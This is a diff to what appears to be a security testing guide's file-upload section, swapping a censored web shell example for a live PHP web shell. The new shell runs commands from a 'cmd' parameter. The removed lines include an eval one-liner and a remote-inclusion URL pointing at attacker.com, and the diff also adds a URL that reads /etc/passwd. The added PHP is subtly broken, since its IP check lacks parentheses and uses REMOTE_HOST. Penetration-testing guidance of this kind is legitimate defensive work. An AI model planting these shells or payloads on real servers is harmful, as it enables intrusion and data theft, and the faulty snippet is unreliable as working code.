@@ -34,43 +34,40 @@ Suppose a picture sharing application allows users to upload their `.gif` or `.j
 
 ### Malicious File
 
-- Develop or create a file that should fail the application malware detection process. There are many available on the Internet such as ducklin.htm or ducklin-html.htm.
-- Submit the executable via the application’s upload functionality and see if it is accepted or properly rejected.
+Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/?page_id=3950), which is an safe file that is flagged as malicious by all anti-malware software.
 
-[Intended Use - EICAR](https://2016.eicar.org/86-0-Intended-use.html)
+When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.
 
-### WebShell Backdoor
+### Web Shells
 
-For example upload the `WebShell-backdoor.php` to the target victim site.
+If the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.
+
+Uploading this kind of shell onto an Internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:
+
+- Uploading the shell with a randomly generated name.
+- Password protecting the shell.
+- Implementing IP based restrictions on the shell.
+
+The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:
 
 ```php
 <?php
-    if(isset($_REQUEST['rq'])){
-        echo "<pre>";
-        $rq= ($_REQUEST['rq']);
-        /* Replace CENSORED with system ($rq) to activate the sample */
-        CENSORED;
-        echo "</pre>";
-        die;
+    if $_SERVER['REMOTE_HOST'] === "FIXME" { // Set your IP address here
+        if(isset($_REQUEST['cmd'])){
+            $cmd = ($_REQUEST['cmd']);
+            echo "<pre>\n";
+            system($cmd);
+            echo "</pre>";
+        }
     }
 ?>
 ```
 
-Once it's uploaded, the testers/hackers may get the password by visiting the URL below.
+Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the "cmd" GET parameter:
 
-`http://TargetVictimSite.com/WebShell-backdoor.php?rq=cat+/etc/passwd`
+`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`
 
-or it may execute by remote file injection as below.
-
-`http://TargetVictimSite.com/File.php?include=http://attacker.com/WebShell-backdoor.php`
-
-Other PHP example:
-
-```php
-<?php @CENSORED($_POST['password']);?>
-```
-
-> Replace @CENSORED with @eval
+**Remember to remove the shell when you are done.**
 
 ### Invalid File
 
